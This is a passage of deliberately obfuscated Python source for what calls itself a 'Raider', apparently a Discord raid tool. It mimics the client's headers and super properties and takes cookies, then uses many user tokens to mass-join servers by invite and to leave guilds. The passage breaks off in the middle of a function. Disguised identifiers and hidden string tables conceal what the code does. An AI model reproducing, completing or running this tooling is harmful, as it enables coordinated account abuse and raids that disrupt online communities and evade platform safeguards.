𝙉𝗡𝘔𝗡𝙡𝗠𝘔𝗹𝘔𝙄𝗹𝙄𝙉𝙄𝘕𝘕𝘐𝙈𝗡𝙉𝙄𝙡[63]}{𝙈𝘔𝙉𝗜𝘔𝘐𝙈𝗜𝘭𝘔𝘕𝗡𝘔𝘕𝘭𝗠𝗠𝙡𝙈𝙄𝘭𝗜𝘕𝗜𝙉𝘕𝘐𝙈𝘕𝙉𝘐𝘭[89].center(𝘀𝗲𝙡𝗳.size)}{𝗠𝘔𝘕𝗜𝙈𝗜𝙈𝗜𝙡𝙈𝗡𝙉𝘔𝙉𝘭𝙈𝗠𝙡𝘔𝗜𝗹𝘐𝘕𝙄𝗡𝗡𝗜𝙈𝘕𝗡𝘐𝙡[63]}'
        for 𝗲𝙙𝘨𝙚 in 𝗲𝘥𝘨𝙚𝘴:
            𝙩𝙞𝘁𝙡𝗲 = 𝘁𝘪𝘵𝘭𝙚.replace(𝗲𝙙𝘨𝗲, f'{𝙁𝘰𝘳𝗲.LIGHTCYAN_EX}{𝗲𝗱𝗴𝘦}{𝗙𝘰𝗿𝗲.RESET}')
        𝙥𝘳𝗶𝘯𝘁(𝘁𝗶𝘁𝘭𝗲)
        𝘰𝘀.system(𝙈𝘔𝗡𝗜𝘔𝗜𝙈𝗜𝘭𝘔𝙉𝘕𝙈𝙉𝘭𝘔𝗠𝗹𝙈𝘐𝘭𝙄𝘕𝘐𝘕𝘕𝗜𝙈𝗡𝙉𝗜𝗹[90])

    def run(self):
        𝙤𝗽𝙩𝙞𝙤𝙣𝘴 = [𝙨𝘦𝗹𝙛.render_ascii(), 𝘀𝙚𝗹𝘧.raider_options()]
        ([𝗼𝘱𝙩𝘪𝗼𝙣] for 𝗼𝗽𝘁𝗶𝗼𝙣 in 𝙤𝘱𝘵𝙞𝗼𝙣𝘀)

    def log(self, text=None, color=None, token=None, log=None):
        𝙧𝘦𝙨𝘱𝙤𝘯𝘴𝗲 = f'{𝗠𝙈𝗡𝘐𝘔𝗜𝗠𝘐𝗹𝗠𝙉𝗡𝘔𝙉𝘭𝗠𝗠𝙡𝗠𝘐𝙡𝙄𝗡𝘐𝗡𝘕𝘐𝙈𝘕𝘕𝘐𝗹[91]}{𝙁𝗼𝗿𝘦.LIGHTBLACK_EX}{𝗱𝙖𝘵𝙚𝙩𝗶𝘮𝗲.now().strftime(𝗠𝙈𝘕𝙄𝙈𝘐𝙈𝗜𝙡𝘔𝙉𝙉𝙈𝗡𝙡𝗠𝘔𝘭𝗠𝙄𝗹𝙄𝙉𝘐𝗡𝗡𝙄𝘔𝘕𝗡𝙄𝘭[92])}{𝙁𝗼𝗿𝘦.RESET}{𝗠𝘔𝘕𝘐𝗠𝗜𝙈𝘐𝘭𝘔𝙉𝘕𝗠𝙉𝙡𝘔𝘔𝗹𝗠𝗜𝙡𝙄𝘕𝗜𝘕𝙉𝗜𝗠𝘕𝙉𝗜𝗹[93]}'
        if 𝘁𝗲𝙭𝘵:
            𝘳𝙚𝘀𝗽𝘰𝘯𝘀𝙚 += f'{𝗠𝘔𝗡𝗜𝗠𝘐𝗠𝗜𝘭𝘔𝙉𝙉𝙈𝗡𝘭𝗠𝗠𝘭𝘔𝗜𝘭𝗜𝘕𝙄𝙉𝘕𝙄𝘔𝙉𝘕𝘐𝗹[91]}{𝙘𝘰𝘭𝗼𝙧}{𝘵𝙚𝘹𝘵}{𝙁𝘰𝘳𝙚.RESET}{𝗠𝙈𝗡𝙄𝗠𝙄𝗠𝘐𝘭𝘔𝘕𝘕𝙈𝗡𝘭𝙈𝙈𝙡𝙈𝘐𝘭𝘐𝙉𝙄𝗡𝗡𝙄𝗠𝙉𝙉𝘐𝙡[93]}'
        if 𝘵𝙤𝗸𝘦𝗻:
            𝘳𝘦𝙨𝙥𝙤𝗻𝘴𝗲 += 𝘁𝙤𝘬𝗲𝙣
        if 𝘭𝗼𝘨:
            𝘳𝘦𝙨𝘱𝘰𝘯𝘴𝗲 += f'{𝘔𝗠𝗡𝘐𝙈𝙄𝗠𝗜𝘭𝗠𝘕𝙉𝗠𝗡𝘭𝗠𝗠𝗹𝘔𝘐𝙡𝗜𝘕𝗜𝘕𝘕𝙄𝙈𝘕𝘕𝘐𝙡[94]}{𝘍𝙤𝘳𝙚.LIGHTBLACK_EX}{𝗹𝙤𝘨}{𝙁𝘰𝙧𝘦.RESET}{𝗠𝙈𝘕𝘐𝘔𝗜𝙈𝘐𝗹𝗠𝗡𝘕𝙈𝗡𝘭𝗠𝙈𝙡𝘔𝙄𝘭𝙄𝗡𝗜𝘕𝙉𝙄𝗠𝗡𝗡𝘐𝘭[95]}'
        𝙥𝘳𝗶𝙣𝘵(𝘳𝙚𝘀𝙥𝙤𝘯𝘴𝙚)

    def prompt(self, text, ask=None):
        𝙧𝙚𝘀𝘱𝘰𝙣𝘀𝙚 = f'{𝗠𝙈𝘕𝘐𝗠𝗜𝙈𝙄𝙡𝗠𝗡𝘕𝙈𝙉𝙡𝙈𝘔𝘭𝗠𝗜𝘭𝙄𝙉𝘐𝗡𝙉𝗜𝙈𝗡𝗡𝗜𝙡[91]}{𝘍𝘰𝘳𝗲.LIGHTCYAN_EX}{𝙩𝘦𝘅𝙩}{𝗙𝙤𝘳𝗲.RESET}'
        if 𝙖𝘀𝘬:
            𝙧𝙚𝘴𝘱𝙤𝘯𝘀𝘦 += f'{𝘔𝘔𝘕𝘐𝗠𝗜𝗠𝘐𝘭𝘔𝘕𝗡𝘔𝘕𝗹𝙈𝘔𝗹𝗠𝙄𝘭𝗜𝙉𝙄𝘕𝗡𝗜𝘔𝘕𝘕𝘐𝘭[96]}{𝗙𝙤𝘳𝙚.LIGHTBLACK_EX}{𝘔𝘔𝙉𝙄𝙈𝗜𝙈𝘐𝗹𝗠𝗡𝘕𝗠𝗡𝙡𝙈𝘔𝘭𝘔𝙄𝙡𝙄𝗡𝘐𝘕𝗡𝘐𝙈𝙉𝗡𝘐𝙡[97]}{𝗙𝗼𝙧𝘦.RESET}{𝗠𝙈𝙉𝘐𝘔𝘐𝙈𝘐𝙡𝗠𝘕𝙉𝘔𝗡𝙡𝘔𝙈𝗹𝗠𝘐𝙡𝙄𝙉𝙄𝙉𝙉𝙄𝙈𝙉𝙉𝙄𝗹[98]}'
        else:
            𝘳𝘦𝙨𝘱𝙤𝗻𝘀𝗲 += f'{𝘔𝘔𝗡𝙄𝗠𝙄𝗠𝗜𝗹𝗠𝗡𝘕𝙈𝘕𝗹𝘔𝗠𝘭𝙈𝗜𝙡𝘐𝙉𝘐𝘕𝗡𝘐𝙈𝘕𝘕𝙄𝗹[99]}'
        return 𝙧𝘦𝙨𝘱𝗼𝘯𝘴𝗲
𝘤𝙤𝗻𝘴𝘰𝙡𝗲 = 𝘙𝘦𝗻𝗱𝗲𝙧()

class Raider:

    def __init__(self):
        𝘀𝘦𝙩𝙖𝘵𝘵𝗿(𝘀𝙚𝙡𝙛, 'cookies', 𝘀𝙚𝗹𝗳.get_discord_cookies())
        𝙨𝗲𝙩𝘢𝙩𝙩𝗿(𝙨𝗲𝘭𝙛, 'props', 𝘀𝗲𝙡𝗳.super_properties())

    def get_discord_cookies(self):
        try:
            𝙧𝙚𝘀𝗽𝘰𝘯𝘀𝘦 = 𝙧𝗲𝘲𝘂𝗲𝙨𝘁𝙨.get(𝗠𝗠𝘕𝗜𝙈𝙄𝙈𝗜𝗹𝙈𝙉𝙉𝘔𝘕𝘭𝘔𝘔𝘭𝙈𝘐𝗹𝗜𝙉𝘐𝘕𝘕𝙄𝗠𝙉𝙉𝗜𝙡[100])
            match 𝗿𝘦𝘀𝗽𝙤𝙣𝘴𝘦.status_code:
                case 200:
                    return 𝘔𝙈𝗡𝘐𝗠𝗜𝗠𝗜𝙡𝙈𝗡𝙉𝙈𝗡𝗹𝗠𝘔𝙡𝙈𝗜𝘭𝗜𝘕𝗜𝙉𝙉𝗜𝘔𝘕𝙉𝘐𝙡[101].join([f'{𝙘𝗼𝗼𝗸𝙞𝗲.name}{𝘔𝗠𝘕𝗜𝙈𝗜𝗠𝗜𝗹𝗠𝙉𝙉𝘔𝗡𝗹𝙈𝙈𝘭𝙈𝙄𝗹𝙄𝘕𝙄𝗡𝗡𝙄𝗠𝗡𝘕𝙄𝘭[102]}{𝙘𝘰𝗼𝙠𝗶𝙚.value}' for 𝘤𝘰𝙤𝘬𝘪𝘦 in 𝙧𝘦𝘴𝗽𝙤𝗻𝙨𝘦.cookies])
                case _:
                    return 𝙈𝘔𝗡𝘐𝗠𝙄𝗠𝙄𝙡𝘔𝙉𝘕𝙈𝘕𝗹𝙈𝘔𝘭𝘔𝘐𝙡𝙄𝘕𝘐𝘕𝘕𝗜𝗠𝗡𝙉𝗜𝙡[103]
        except 𝗘𝘹𝗰𝙚𝘱𝙩𝘪𝘰𝗻 as e:
            𝙥𝙧𝘪𝗻𝘵(f'{𝙈𝙈𝘕𝗜𝘔𝙄𝘔𝙄𝗹𝘔𝘕𝙉𝗠𝗡𝙡𝘔𝗠𝗹𝙈𝙄𝘭𝙄𝙉𝗜𝙉𝙉𝙄𝗠𝙉𝗡𝙄𝘭[104]}{𝙚}{𝙈𝘔𝗡𝘐𝘔𝙄𝙈𝗜𝙡𝗠𝗡𝗡𝗠𝙉𝘭𝙈𝙈𝘭𝙈𝗜𝘭𝘐𝙉𝘐𝙉𝘕𝗜𝘔𝗡𝙉𝘐𝙡[105]}')

    def super_properties(self):
        𝗽𝙖𝙮𝘭𝙤𝘢𝗱 = {𝗠𝙈𝗡𝙄𝙈𝙄𝗠𝘐𝘭𝘔𝘕𝘕𝗠𝙉𝙡𝗠𝗠𝙡𝙈𝗜𝙡𝗜𝘕𝗜𝘕𝙉𝗜𝘔𝘕𝗡𝘐𝙡[106]: 𝘔𝗠𝘕𝗜𝘔𝙄𝘔𝙄𝗹𝗠𝘕𝘕𝘔𝙉𝗹𝗠𝙈𝘭𝙈𝘐𝙡𝘐𝙉𝗜𝙉𝗡𝙄𝙈𝘕𝙉𝘐𝙡[118], 𝘔𝗠𝗡𝙄𝘔𝘐𝙈𝙄𝘭𝗠𝘕𝗡𝘔𝙉𝙡𝘔𝗠𝘭𝙈𝗜𝘭𝙄𝘕𝗜𝘕𝗡𝘐𝙈𝗡𝘕𝗜𝗹[107]: 𝙈𝘔𝘕𝙄𝘔𝗜𝘔𝘐𝙡𝘔𝗡𝙉𝙈𝗡𝙡𝙈𝗠𝙡𝙈𝘐𝙡𝗜𝙉𝘐𝘕𝙉𝘐𝘔𝘕𝗡𝗜𝘭[119], 𝗠𝙈𝗡𝙄𝙈𝙄𝗠𝘐𝗹𝗠𝙉𝗡𝗠𝗡𝘭𝗠𝙈𝘭𝘔𝙄𝗹𝙄𝘕𝗜𝙉𝙉𝘐𝗠𝘕𝙉𝘐𝘭[108]: 𝗠𝙈𝙉𝘐𝘔𝗜𝘔𝘐𝘭𝘔𝗡𝙉𝘔𝙉𝙡𝙈𝗠𝘭𝙈𝘐𝙡𝙄𝘕𝗜𝙉𝘕𝗜𝗠𝘕𝘕𝘐𝙡[120], 𝘔𝘔𝙉𝙄𝙈𝗜𝙈𝘐𝘭𝘔𝗡𝘕𝙈𝗡𝘭𝗠𝙈𝗹𝘔𝗜𝘭𝘐𝘕𝗜𝙉𝗡𝘐𝗠𝗡𝗡𝙄𝗹[109]: 𝙈𝙈𝙉𝗜𝘔𝙄𝗠𝙄𝗹𝙈𝙉𝘕𝘔𝘕𝙡𝘔𝘔𝘭𝗠𝙄𝙡𝗜𝗡𝗜𝗡𝗡𝘐𝙈𝙉𝘕𝘐𝙡[121], 𝘔𝘔𝗡𝘐𝙈𝘐𝗠𝙄𝙡𝘔𝙉𝙉𝗠𝘕𝙡𝗠𝗠𝙡𝗠𝘐𝘭𝗜𝗡𝗜𝗡𝗡𝗜𝘔𝘕𝘕𝘐𝗹[110]: 𝙈𝗠𝘕𝗜𝙈𝘐𝙈𝘐𝗹𝗠𝘕𝗡𝗠𝗡𝗹𝗠𝘔𝘭𝗠𝘐𝗹𝘐𝙉𝗜𝘕𝘕𝙄𝗠𝙉𝗡𝘐𝙡[122], 𝘔𝙈𝘕𝗜𝘔𝗜𝙈𝙄𝙡𝘔𝙉𝘕𝗠𝗡𝘭𝙈𝙈𝙡𝘔𝘐𝙡𝗜𝙉𝗜𝘕𝗡𝗜𝘔𝗡𝘕𝗜𝘭[111]: 𝗠𝗠𝗡𝗜𝘔𝗜𝘔𝗜𝗹𝙈𝙉𝘕𝘔𝙉𝘭𝙈𝗠𝙡𝘔𝗜𝘭𝗜𝘕𝙄𝘕𝗡𝙄𝙈𝘕𝙉𝘐𝘭[123], 𝙈𝙈𝗡𝘐𝙈𝘐𝗠𝘐𝙡𝗠𝘕𝘕𝘔𝙉𝘭𝘔𝘔𝗹𝙈𝗜𝗹𝘐𝗡𝗜𝗡𝘕𝘐𝗠𝘕𝘕𝙄𝙡[112]: 𝗠𝘔𝗡𝙄𝙈𝙄𝗠𝙄𝗹𝗠𝗡𝘕𝗠𝙉𝗹𝙈𝗠𝗹𝘔𝗜𝙡𝙄𝙉𝘐𝗡𝘕𝗜𝗠𝙉𝘕𝙄𝘭[124], 𝙈𝙈𝗡𝙄𝘔𝙄𝗠𝙄𝗹𝗠𝙉𝗡𝘔𝗡𝙡𝗠𝘔𝗹𝘔𝘐𝘭𝗜𝘕𝘐𝙉𝘕𝙄𝘔𝘕𝙉𝗜𝗹[113]: 𝗠𝙈𝘕𝘐𝙈𝗜𝙈𝙄𝘭𝘔𝘕𝙉𝗠𝘕𝙡𝗠𝘔𝗹𝗠𝗜𝙡𝘐𝙉𝗜𝘕𝘕𝘐𝘔𝗡𝙉𝗜𝗹[125], 𝘔𝘔𝗡𝙄𝘔𝙄𝗠𝘐𝙡𝘔𝙉𝙉𝙈𝗡𝙡𝘔𝗠𝘭𝘔𝙄𝙡𝙄𝘕𝙄𝘕𝘕𝙄𝘔𝗡𝙉𝘐𝘭[114]: 𝗠𝙈𝙉𝘐𝘔𝘐𝗠𝙄𝙡𝘔𝙉𝗡𝗠𝙉𝙡𝙈𝙈𝘭𝙈𝗜𝙡𝗜𝙉𝙄𝘕𝗡𝙄𝙈𝗡𝗡𝘐𝙡[126], 𝙈𝘔𝙉𝘐𝙈𝘐𝘔𝗜𝙡𝙈𝘕𝗡𝗠𝘕𝙡𝗠𝗠𝙡𝙈𝘐𝙡𝙄𝗡𝘐𝗡𝗡𝗜𝙈𝙉𝗡𝙄𝙡[115]: 226220, 𝗠𝙈𝘕𝗜𝙈𝗜𝗠𝘐𝘭𝙈𝗡𝘕𝙈𝙉𝗹𝘔𝘔𝘭𝘔𝗜𝘭𝙄𝙉𝗜𝙉𝗡𝗜𝘔𝗡𝗡𝘐𝙡[116]: 36442, 𝙈𝘔𝗡𝙄𝘔𝗜𝗠𝙄𝗹𝙈𝙉𝙉𝗠𝘕𝗹𝙈𝗠𝙡𝙈𝗜𝙡𝘐𝙉𝘐𝘕𝗡𝗜𝙈𝙉𝙉𝙄𝗹[117]: None}
        𝘱𝗿𝙤𝘱𝘦𝘳𝘁𝗶𝗲𝙨 = 𝙗𝗮𝘀𝗲64.b64encode(𝗷𝙨𝙤𝘯.dumps(𝘱𝙖𝘺𝗹𝘰𝙖𝘥).encode()).decode()
        return 𝙥𝘳𝙤𝘱𝙚𝘳𝘁𝗶𝗲𝙨

    def heders(self, token):
        return {𝘔𝙈𝗡𝗜𝘔𝗜𝙈𝘐𝗹𝘔𝙉𝗡𝘔𝙉𝘭𝗠𝙈𝙡𝗠𝙄𝗹𝘐𝘕𝙄𝙉𝙉𝙄𝗠𝗡𝙉𝗜𝘭[127]: 𝙈𝘔𝗡𝘐𝘔𝙄𝙈𝘐𝙡𝙈𝗡𝗡𝙈𝙉𝗹𝙈𝗠𝗹𝙈𝙄𝗹𝙄𝗡𝘐𝗡𝘕𝗜𝗠𝙉𝘕𝗜𝙡[136], 𝙈𝙈𝗡𝘐𝙈𝙄𝙈𝘐𝘭𝘔𝘕𝙉𝗠𝘕𝗹𝘔𝘔𝙡𝙈𝘐𝘭𝙄𝘕𝙄𝗡𝗡𝘐𝗠𝙉𝘕𝙄𝘭[128]: 𝗠𝙈𝘕𝘐𝗠𝙄𝗠𝙄𝘭𝙈𝗡𝗡𝙈𝙉𝗹𝙈𝗠𝗹𝙈𝙄𝙡𝗜𝘕𝙄𝘕𝘕𝗜𝗠𝗡𝗡𝙄𝘭[137], 𝘔𝙈𝙉𝗜𝘔𝗜𝗠𝘐𝘭𝘔𝗡𝗡𝗠𝘕𝙡𝙈𝘔𝗹𝙈𝙄𝙡𝙄𝗡𝘐𝘕𝘕𝗜𝗠𝘕𝗡𝗜𝗹[129]: 𝘔𝘔𝘕𝘐𝙈𝗜𝗠𝙄𝙡𝙈𝘕𝗡𝗠𝙉𝘭𝙈𝘔𝙡𝘔𝗜𝙡𝘐𝘕𝙄𝘕𝗡𝘐𝙈𝙉𝘕𝙄𝗹[124], 𝙈𝗠𝙉𝙄𝗠𝘐𝙈𝙄𝙡𝗠𝗡𝗡𝘔𝗡𝗹𝘔𝗠𝙡𝙈𝙄𝘭𝙄𝗡𝗜𝘕𝙉𝗜𝗠𝗡𝗡𝗜𝗹[130]: 𝙩𝗼𝙠𝘦𝗻, 𝗠𝘔𝗡𝗜𝘔𝘐𝘔𝙄𝗹𝗠𝗡𝘕𝗠𝙉𝘭𝙈𝙈𝘭𝘔𝙄𝘭𝙄𝘕𝙄𝗡𝙉𝘐𝘔𝗡𝗡𝙄𝙡[131]: 𝙨𝗲𝙡𝘧.cookies, 𝙈𝗠𝗡𝘐𝙈𝘐𝘔𝘐𝘭𝗠𝗡𝗡𝙈𝙉𝗹𝙈𝘔𝗹𝗠𝗜𝗹𝘐𝙉𝗜𝗡𝘕𝗜𝙈𝗡𝗡𝗜𝗹[132]: 𝙈𝘔𝗡𝘐𝗠𝗜𝗠𝗜𝗹𝙈𝙉𝘕𝘔𝙉𝘭𝙈𝙈𝗹𝘔𝙄𝙡𝗜𝙉𝙄𝘕𝗡𝙄𝗠𝘕𝘕𝘐𝘭[138], 𝘔𝙈𝘕𝘐𝙈𝗜𝗠𝙄𝗹𝙈𝘕𝗡𝘔𝗡𝘭𝗠𝗠𝙡𝙈𝙄𝘭𝗜𝗡𝘐𝗡𝘕𝗜𝗠𝘕𝘕𝙄𝗹[133]: 𝙈𝘔𝗡𝗜𝙈𝗜𝙈𝘐𝙡𝘔𝗡𝙉𝘔𝗡𝘭𝗠𝙈𝘭𝙈𝘐𝘭𝗜𝗡𝙄𝗡𝘕𝙄𝘔𝗡𝙉𝘐𝘭[125], 𝙈𝘔𝘕𝗜𝗠𝙄𝗠𝙄𝘭𝙈𝙉𝘕𝘔𝙉𝗹𝘔𝘔𝙡𝗠𝗜𝙡𝗜𝙉𝗜𝙉𝘕𝗜𝙈𝙉𝘕𝙄𝙡[134]: 𝘔𝘔𝗡𝗜𝘔𝗜𝙈𝘐𝘭𝗠𝙉𝗡𝘔𝘕𝙡𝗠𝘔𝙡𝗠𝘐𝙡𝙄𝗡𝗜𝘕𝗡𝗜𝗠𝗡𝘕𝙄𝘭[139], 𝗠𝘔𝙉𝗜𝘔𝘐𝙈𝙄𝘭𝗠𝘕𝗡𝗠𝗡𝙡𝘔𝘔𝗹𝙈𝙄𝗹𝘐𝗡𝗜𝘕𝙉𝗜𝗠𝘕𝗡𝗜𝗹[135]: 𝘀𝘦𝗹𝙛.props}

    def joiner(self, token, invite):
        𝗼𝘴.system(𝗠𝙈𝙉𝘐𝙈𝘐𝗠𝘐𝗹𝘔𝙉𝗡𝘔𝘕𝙡𝙈𝘔𝘭𝘔𝙄𝙡𝘐𝘕𝘐𝘕𝘕𝗜𝘔𝙉𝙉𝙄𝗹[140])
        try:
            𝘱𝘢𝙮𝗹𝘰𝗮𝙙 = {𝙈𝗠𝗡𝙄𝙈𝘐𝙈𝗜𝙡𝘔𝗡𝘕𝙈𝙉𝗹𝙈𝙈𝗹𝘔𝗜𝘭𝗜𝙉𝗜𝗡𝗡𝗜𝗠𝘕𝘕𝙄𝘭[141]: 𝙪𝘂𝗶𝗱.uuid4().hex}
            𝙧𝘦𝙨𝗽𝗼𝙣𝘀𝘦 = 𝘴𝘦𝙨𝘴𝘪𝗼𝗻.post(f'{𝗠𝙈𝘕𝗜𝙈𝙄𝗠𝗜𝘭𝗠𝗡𝗡𝙈𝗡𝙡𝙈𝗠𝘭𝙈𝘐𝗹𝙄𝙉𝘐𝘕𝙉𝙄𝘔𝘕𝙉𝘐𝘭[142]}{𝘪𝙣𝙫𝗶𝘁𝘦}', headers=𝙨𝗲𝘭𝘧.heders(𝘁𝙤𝘬𝙚𝘯), json=𝗽𝙖𝘺𝗹𝗼𝙖𝘥)
            match 𝗿𝗲𝘴𝙥𝘰𝙣𝙨𝗲.status_code:
                case 200:
                    𝗽𝙧𝙞𝘯𝙩(f'{𝙈𝙈𝙉𝙄𝗠𝘐𝗠𝙄𝗹𝙈𝗡𝗡𝙈𝗡𝙡𝙈𝙈𝙡𝗠𝗜𝘭𝗜𝘕𝘐𝘕𝗡𝙄𝙈𝙉𝙉𝗜𝗹[91]}{𝙡𝗰}{𝗠𝗠𝘕𝘐𝙈𝗜𝙈𝘐𝙡𝘔𝘕𝘕𝗠𝗡𝙡𝙈𝗠𝘭𝗠𝙄𝗹𝗜𝘕𝘐𝗡𝘕𝙄𝘔𝗡𝗡𝙄𝘭[143]}{𝙧}{𝗠𝗠𝙉𝗜𝘔𝙄𝗠𝙄𝙡𝗠𝘕𝙉𝘔𝗡𝘭𝗠𝘔𝘭𝗠𝗜𝘭𝘐𝙉𝙄𝘕𝗡𝙄𝗠𝗡𝙉𝘐𝗹[99]}{𝘁𝘰𝗸𝗲𝗻[:25]}{𝗠𝘔𝗡𝙄𝘔𝘐𝙈𝘐𝘭𝘔𝘕𝙉𝙈𝙉𝘭𝙈𝘔𝗹𝗠𝗜𝗹𝗜𝘕𝘐𝘕𝘕𝙄𝗠𝙉𝘕𝘐𝗹[144]}{𝘪𝘯𝙫𝗶𝘵𝘦}{𝙈𝗠𝙉𝘐𝗠𝙄𝙈𝘐𝗹𝘔𝙉𝘕𝙈𝙉𝙡𝙈𝙈𝙡𝘔𝙄𝙡𝘐𝙉𝗜𝙉𝗡𝗜𝘔𝙉𝙉𝙄𝙡[95]}')
                case 400:
                    𝗽𝗿𝙞𝘯𝘵(f'{𝗠𝗠𝙉𝘐𝙈𝘐𝘔𝗜𝗹𝘔𝘕𝘕𝗠𝘕𝙡𝘔𝘔𝗹𝙈𝙄𝗹𝗜𝙉𝙄𝗡𝗡𝘐𝘔𝗡𝙉𝙄𝗹[91]}{𝘭𝙘}{𝗠𝘔𝗡𝙄𝙈𝙄𝘔𝗜𝙡𝘔𝙉𝗡𝗠𝗡𝗹𝘔𝙈𝙡𝗠𝙄𝙡𝗜𝗡𝙄𝗡𝙉𝗜𝙈𝙉𝗡𝘐𝗹[145]}{𝙧}{𝙈𝙈𝘕𝘐𝙈𝗜𝙈𝘐𝗹𝙈𝗡𝘕𝘔𝗡𝗹𝘔𝗠𝗹𝙈𝗜𝘭𝙄𝘕𝙄𝙉𝗡𝙄𝘔𝗡𝘕𝙄𝗹[99]}{𝙩𝘰𝗸𝗲𝙣[:25]}{𝘔𝗠𝙉𝘐𝗠𝗜𝗠𝗜𝙡𝘔𝗡𝗡𝘔𝘕𝘭𝘔𝙈𝘭𝙈𝙄𝗹𝗜𝘕𝗜𝙉𝘕𝗜𝘔𝘕𝘕𝘐𝘭[144]}{𝙞𝙣𝙫𝗶𝘁𝙚}{𝙈𝘔𝗡𝘐𝘔𝙄𝙈𝙄𝗹𝙈𝘕𝗡𝗠𝘕𝘭𝘔𝙈𝘭𝘔𝘐𝘭𝙄𝘕𝗜𝙉𝗡𝗜𝗠𝗡𝗡𝗜𝘭[95]}')
                case 429:
                    𝗽𝙧𝘪𝗻𝘵(f'{𝙈𝘔𝗡𝘐𝙈𝙄𝘔𝗜𝘭𝘔𝙉𝘕𝗠𝗡𝗹𝘔𝗠𝙡𝙈𝘐𝗹𝙄𝘕𝗜𝗡𝙉𝙄𝘔𝙉𝗡𝙄𝗹[91]}{𝘭𝗰}{𝗠𝗠𝙉𝗜𝙈𝘐𝘔𝘐𝙡𝘔𝙉𝗡𝘔𝘕𝗹𝘔𝗠𝘭𝗠𝗜𝘭𝗜𝘕𝙄𝙉𝘕𝙄𝙈𝗡𝗡𝘐𝘭[146]}{𝘳}{𝙈𝗠𝗡𝗜𝙈𝘐𝗠𝙄𝙡𝘔𝘕𝙉𝙈𝗡𝘭𝙈𝗠𝙡𝘔𝙄𝙡𝗜𝗡𝙄𝘕𝗡𝗜𝘔𝘕𝙉𝘐𝙡[99]}{𝘁𝘰𝗸𝗲𝘯[:25]}{𝗠𝙈𝙉𝗜𝘔𝘐𝗠𝘐𝙡𝙈𝗡𝘕𝙈𝙉𝙡𝗠𝗠𝙡𝙈𝘐𝗹𝗜𝙉𝘐𝙉𝙉𝗜𝘔𝘕𝙉𝘐𝙡[144]}{𝘪𝙣𝘷𝙞𝘵𝘦}{𝙈𝙈𝘕𝙄𝘔𝘐𝙈𝙄𝗹𝙈𝗡𝙉𝙈𝗡𝙡𝗠𝗠𝗹𝗠𝗜𝘭𝗜𝘕𝗜𝗡𝗡𝘐𝗠𝘕𝘕𝘐𝘭[95]}')
                case _:
                    𝗽𝗿𝗶𝗻𝘁(f'{𝘔𝙈𝙉𝗜𝘔𝙄𝘔𝙄𝙡𝗠𝙉𝘕𝗠𝙉𝙡𝙈𝙈𝗹𝘔𝙄𝗹𝗜𝙉𝘐𝘕𝘕𝗜𝗠𝗡𝘕𝙄𝘭[91]}{𝗹𝗰}{𝗠𝗠𝗡𝘐𝘔𝙄𝗠𝗜𝘭𝙈𝗡𝗡𝙈𝘕𝗹𝘔𝘔𝙡𝙈𝙄𝘭𝙄𝗡𝘐𝗡𝗡𝙄𝗠𝗡𝙉𝗜𝘭[147]}{𝙧}{𝗠𝗠𝗡𝙄𝗠𝗜𝗠𝙄𝗹𝘔𝘕𝘕𝙈𝘕𝘭𝗠𝙈𝘭𝘔𝘐𝘭𝗜𝘕𝘐𝘕𝘕𝙄𝙈𝘕𝘕𝙄𝘭[99]}{𝙩𝗼𝗸𝘦𝘯[:25]}{𝗠𝙈𝘕𝗜𝘔𝗜𝗠𝙄𝗹𝙈𝘕𝙉𝘔𝗡𝙡𝙈𝗠𝙡𝘔𝘐𝗹𝗜𝘕𝘐𝘕𝗡𝗜𝙈𝘕𝙉𝗜𝙡[94]}{𝙧𝗲𝘀𝘱𝘰𝘯𝙨𝘦.json()[𝘔𝗠𝘕𝗜𝗠𝘐𝙈𝘐𝗹𝘔𝘕𝘕𝗠𝙉𝙡𝘔𝘔𝗹𝗠𝗜𝗹𝗜𝘕𝘐𝗡𝙉𝗜𝗠𝘕𝗡𝘐𝙡[148]]}{𝘔𝘔𝙉𝙄𝙈𝗜𝙈𝙄𝗹𝘔𝘕𝗡𝙈𝘕𝙡𝙈𝗠𝗹𝗠𝗜𝙡𝗜𝙉𝘐𝗡𝘕𝙄𝙈𝘕𝙉𝙄𝙡[95]}')
        except 𝘌𝙭𝘤𝘦𝙥𝙩𝙞𝗼𝘯 as e:
            𝙥𝘳𝘪𝗻𝙩(f'{𝘔𝗠𝙉𝘐𝘔𝙄𝘔𝘐𝗹𝙈𝙉𝘕𝘔𝙉𝗹𝙈𝙈𝙡𝘔𝗜𝗹𝙄𝗡𝙄𝗡𝗡𝗜𝗠𝙉𝙉𝗜𝘭[91]}{𝘭𝗰}{𝙈𝙈𝙉𝙄𝙈𝗜𝗠𝙄𝙡𝙈𝙉𝙉𝗠𝙉𝗹𝗠𝗠𝙡𝙈𝗜𝘭𝗜𝘕𝙄𝗡𝗡𝘐𝙈𝗡𝘕𝘐𝘭[149]}{𝘳}{𝗠𝗠𝘕𝘐𝗠𝙄𝗠𝘐𝗹𝙈𝗡𝗡𝗠𝘕𝘭𝗠𝙈𝗹𝗠𝘐𝗹𝘐𝘕𝘐𝙉𝘕𝙄𝗠𝗡𝘕𝙄𝙡[99]}{𝙚}{𝘔𝙈𝘕𝗜𝙈𝘐𝗠𝘐𝘭𝗠𝘕𝘕𝙈𝙉𝗹𝘔𝘔𝘭𝗠𝘐𝗹𝙄𝙉𝙄𝙉𝙉𝗜𝙈𝗡𝙉𝘐𝘭[150]}')

    def leaver(self, token, guild):
        𝗼𝙨.system(𝗠𝘔𝗡𝘐𝘔𝗜𝙈𝘐𝗹𝗠𝘕𝘕𝗠𝗡𝙡𝙈𝘔𝙡𝗠𝙄𝘭𝘐𝗡𝙄𝘕𝗡𝗜𝗠𝗡𝗡𝗜𝗹[151])
        try:

            def get_guild_name(guild):
                𝘪𝙣_𝗴𝙪𝙞𝘭𝘥 = []
                for 𝘁𝘰𝙠𝘦𝙣 in 𝘵𝙤𝙠𝙚𝘯𝘀:
                    𝗿𝗲𝙨𝗽𝙤𝘯𝘴𝗲 = 𝘀𝘦𝘴𝙨𝙞𝙤𝙣.get(f'{𝘔𝘔𝙉𝙄𝗠𝙄𝙈𝗜𝘭𝙈𝗡𝗡𝘔𝙉𝗹𝘔𝗠𝙡𝘔𝘐𝗹𝙄𝗡𝙄𝘕𝘕𝗜𝙈𝙉𝘕𝘐𝙡[152]}{𝗴𝘶𝗶𝘭𝘥}', headers=𝘴𝙚𝘭𝘧.headers(𝘵𝘰𝗸𝗲𝗻))
                    match 𝘳𝗲𝙨𝗽𝘰𝗻𝘴𝗲.status_code:
                        case 200:
                            𝙞𝙣_𝘨𝘂𝗶𝘭𝙙.append(𝘁𝗼𝗸𝘦𝗻)
                            try:
